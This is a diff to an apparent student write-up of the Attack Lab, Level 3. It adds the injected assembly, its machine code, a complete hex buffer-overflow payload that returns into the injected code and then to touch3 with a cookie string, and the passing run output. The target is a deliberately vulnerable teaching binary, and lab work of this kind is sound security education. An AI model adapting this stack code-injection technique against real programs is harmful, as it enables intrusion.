@@ -224,5 +224,44 @@ According to the stack structure in Level 2, the address of this string is
 `0x5561dcb0`. So our assembly code to inject is:
 ```asm
   mov $0x5561dcb0,%rdi    # set the address of cookie string to %rdi
-  retq                    # go to <touch3>
+  ret                     # go to <touch3>
 ```
+Similar to Level 2, we use `gcc` and `objdump` to get the machine code
+```bash
+  03-Attack-Lab/src > gcc -c ctarget.code.l3.s
+  03-Attack-Lab/src > objdump -d ctarget.code.l3.o > ctarget.code.l3.d
+  03-Attack-Lab/src > cat ctarget.code.l3.d
+    ctarget.code.l3.o:     file format elf64-x86-64
+    Disassembly of section .text:
+    0000000000000000 <.text>:
+       0:   48 c7 c7 b0 dc 61 55    mov    $0x5561dcb0,%rdi
+       7:   c3                      retq
+```
+Besides, we put the ascii encoded of cookie string `'59b997fa'` of 8 bytes to
+the address `0x5561dcb0`, which is exactly the stack frame above the redirection
+address to `<touch3>`. We arrive at our exploit for level 3:
+```
+  48 c7 c7 b0 dc 61 55 c3    /* injected code */
+  00 00 00 00 00 00 00 00
+  00 00 00 00 00 00 00 00
+  00 00 00 00 00 00 00 00
+  00 00 00 00 00 00 00 00
+  78 dc 61 55 00 00 00 00    /* the address of injected code */
+  fa 18 40 00 00 00 00 00    /* the address of <touch3> */
+  35 39 62 39 39 37 66 61    /* the cookie string in ascii */
+  00 00 00 00 00 00 00 00
+```
+Put the above exploit to file `ctarget.exploit.l3.txt` and execute it:
+```
+  03-Attack-Lab/src > cat ctarget.exploit.l3.txt | ./hex2raw | ./ctarget -q
+    Cookie: 0x59b997fa
+    Type string:Touch3!: You called touch3("59b997fa")
+    Valid solution for level 3 with target ctarget
+    PASS: ...
+```
+
+## Return-Oriented Programming
+
+## Level 2
+
+## Level 3
